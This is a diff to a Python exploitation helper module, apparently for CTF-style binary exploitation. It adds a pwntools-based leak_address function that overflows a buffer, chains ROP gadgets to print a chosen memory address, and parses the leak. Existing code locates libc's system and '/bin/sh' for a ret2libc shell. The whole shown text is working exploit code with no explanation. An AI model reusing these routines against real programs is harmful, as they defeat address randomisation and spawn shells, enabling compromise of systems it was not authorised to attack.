@@ -3,6 +3,8 @@ import urllib.request
 
 import requests
 from bs4 import BeautifulSoup
+from pwnlib.rop import ROP
+from pwnlib.util.packing import u64
 
 
 def fetch_libc_ver(addr, func="_IO_puts"):
@@ -37,3 +39,17 @@ def system_shell(libc):
     sys = libc.symbols.system
     sh = next(libc.search(b"/bin/sh"))
     return sys, sh
+
+
+def leak_address(process, padding_length, elf, address, printer, ret):
+    padding = b"a" * (padding_length - 3) + b"LOL"
+    rop = ROP(elf)
+    rop.call(printer, (address,))
+    rop.call(ret)
+    process.sendline(padding + rop.chain())
+    while True:
+        r = process.recvline()
+        if b"LOL" not in r:
+            continue
+        addr = r[-7:-1] + b"\0\0"
+        return u64(addr)
